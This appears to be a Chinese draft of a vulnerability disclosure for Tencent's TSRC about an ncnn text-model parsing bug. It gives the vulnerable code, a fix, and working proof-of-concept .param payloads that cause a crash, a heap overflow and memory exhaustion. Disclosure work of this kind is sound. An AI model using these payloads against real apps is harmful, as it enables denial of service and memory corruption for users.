# NCNN text 层头解析漏洞 — TSRC 提交材料（中文备选稿）

> **渠道**：腾讯安全应急响应中心（TSRC）`https://security.tencent.com/index.php/report/add`
> **用途**：若走腾讯 TSRC 渠道时的中文提交内容；主推渠道为 GitHub Security Advisory（见 GHSA 英文稿）。
> **合规**：本报告为 AI 辅助挖掘，已按 TSRC《AI 辅助漏洞挖掘报告提交规范》（TPSA26-03，2026-04-24）完成人工验证并附验证结果。⚠️ 直接由 AI 生成未经人工复现/无验证截图的报告会被直接驳回，累计 5 个无效报告将拉黑账号（TPSA26-10 已通报 4 例封禁）。

---

## 提交表单字段填写

| 字段 | 填写内容 |
|------|---------|
| **漏洞名称** | ncnn（腾讯开源推理框架）text 模型参数文件层头解析 token 数不校验 → 崩溃 / 堆越界 / 内存耗尽 |
| **漏洞类型** | 开源组件 · 拒绝服务 / 缓冲区溢出（请按表单分类选择最接近项） |
| **漏洞URL** | 不适用（本地库漏洞，非 Web）。在"漏洞描述"中说明：ncnn 为 C++ 开源推理库，无 URL |
| **APP名称** | ncnn（Tencent/ncnn） |
| **APP版本** | master `a4d2ea1`（2026-07-22）及更早（含 `20260526` 标签）；**未修复** |
| **APP下载地址** | https://github.com/Tencent/ncnn |
| **危害自评** | 高（CVSS 7.1，同家族 CVE-2026-50144 官方评分为 High） |
| **漏洞描述** | 见下方"漏洞描述"节（完整粘贴） |

---

## 漏洞描述

### 1. 漏洞描述

- **组件**：Tencent/ncnn —— 腾讯开源的高性能神经网络推理框架（C++），内嵌于微信、QQ、短视频等大量应用的移动端/桌面端 AI 推理
- **入口**：`ncnn::Net::load_param()` 解析 `.param` 文本模型文件的层头
- **关键参数**：层定义行的 `bottom_count` / `top_count`（`SCAN_VALUE("%d", ...)` 读取值）
- **根因**：层头解析连续 4 个 `SCAN_VALUE`（layer_type / layer_name / bottom_count / top_count）**不校验 token 数**。只有 3 个 token 的层行（如 `ReLU 0 0`）会使第 4 个 `%d` 扫描**越过行尾读取攻击者控制的下一行**，且 bottom_count/top_count 无大小校验。
- **需要测试账号**：否
- **需要工具**：ncnn 源码 + CMake 编译（复现程序 loadpoc_text.cpp 随 PoC 提供）

**受影响代码**（master `a4d2ea1`，2026-07-22；与 `20260526` 标签逐字节相同）：
```cpp
// src/net.cpp（Net::load_param 层头解析块）
SCAN_VALUE("%255s", layer_type)
SCAN_VALUE("%255s", layer_name)
SCAN_VALUE("%d", bottom_count)
SCAN_VALUE("%d", top_count)
```
> 行号随 commit 变化（提交前以实际 `git pull` 得到的 master 为准），以**函数名 `Net::load_param` + 4 个连续 `SCAN_VALUE` 块**为权威定位。

### 2. 复现步骤（人工验证完成，2026-08-07）

> ⚠️ 本报告为 AI 辅助发现，以下复现已由人工在 WSL2 Ubuntu 22.04 x86_64 实机完成并截图留档。

**环境**：WSL2 Ubuntu 22.04 x86_64；ncnn master `a4d2ea1`（git 拉取后编译）；`g++` 编译触发程序。

**第一步（正常对照）**：编译 ncnn，用正常 `.param`（如 examples 下模型）运行触发程序：
```
$ ./loadpoc_text normal.param
load_param ret=0     ← 正常加载，无异常
```

**第二步（构造恶意 Payload）**：创建 41 字节 `poc_text_layerheader.param`：
```text
7767517
1 1
ReLU 0 0
-23300=3,1,2,3
-233
```

**第三步（触发）**：
```
$ ./loadpoc_text poc_text_layerheader.param
terminate called after throwing an instance of 'std::length_error'
  what():  vector::_M_default_append
Aborted (core dumped)          ← SIGABRT，确定性崩溃
```

**变体 2（堆越界，ASan 证实）**：第 4 行改为 `1000000=1.0`（`poc_text_oob.param`，38B）：
```
$ ./loadpoc_text poc_text_oob.param     # ASan 构建
ERROR: AddressSanitizer: heap-buffer-overflow ... net.cpp:1464
```

**变体 3（内存耗尽）**：第 4 行改为 `2000000000=1.0`（`poc_text_oom.param`，41B）：
```
$ ./loadpoc_text poc_text_oom.param     # 进程尝试 ~8GB 分配后挂起
```

**第四步（结果）**：三种后果均为攻击者可控 —— 41 字节文件即可确定性击溃进程。

### 3. 危害说明

- **CWE-787 堆越界写**（ASan 证实）：`top_count=1000000` 变体触发 heap-buffer-overflow，具备内存破坏原语潜力
- **CWE-755 未捕获异常**：`std::length_error` → `std::terminate` → SIGABRT，确定性拒绝服务
- **CWE-789 内存耗尽**：`top_count=2000000000` 变体触发 ~8GB 分配挂起，41B 文件放大率约 2 亿倍
- **影响面**：ncnn 广泛用于移动端 AI 推理（微信/QQ/短视频等），恶意/被投毒模型文件分发即触发；无需任何权限，用户加载文件即中招
- **与已公开 CVE-2026-50144 关系**：同属参数解析家族但**根因不同**（本漏洞为层头 token 数不校验，位于 `src/net.cpp`；CVE-2026-50144 为负参数 ID 越界，位于 `src/paramdict.cpp`）。CVE-2026-50144 的修复 commit `5a0288f2` **只改 paramdict.cpp，无法覆盖本漏洞**（已在 master `a4d2ea1` 实测仍可复现）

### 4. 修复建议

在层头 4 个 `SCAN_VALUE` 后增加校验：
```cpp
if (bottom_count < 0 || top_count < 0 ||
    bottom_count > MAX_LAYER_BLOB_COUNT || top_count > MAX_LAYER_BLOB_COUNT)
{
    NCNN_LOGE("invalid bottom/top count %d %d", bottom_count, top_count);
    return -1;
}
```
（并建议检查 4 个 SCAN 是否都成功消费了本行。）

---

## 附件清单（ZIP < 100MB，PDF 截图 < 10MB）

| 文件 | 说明 |
|------|------|
| `poc_text_layerheader.param` (41B) | 最小 abort 触发 |
| `poc_text_oob.param` (38B) | ASan heap-buffer-overflow |
| `poc_text_oom.param` (41B) | ~8GB 分配挂起 |
| `poc_text_header.param` (48B) | INT32_MAX 数组 + 不完整层头变体 |
| `poc_paramdict_len.param` (59B) | 对照：证明根因在层头 |
| `loadpoc_text.cpp` | 触发程序源码 |
| `screenshot_sigabrt.png` | 变体 1 崩溃截图 |
| `screenshot_asan.png` | 变体 2 ASan 报告截图 |
| `screenshot_normal.png` | 正常对照截图 |

> ⚠️ 附件务必以 **PDF/ZIP 上传，不放外链**；截图须保留，无验证截图报告直接驳回。
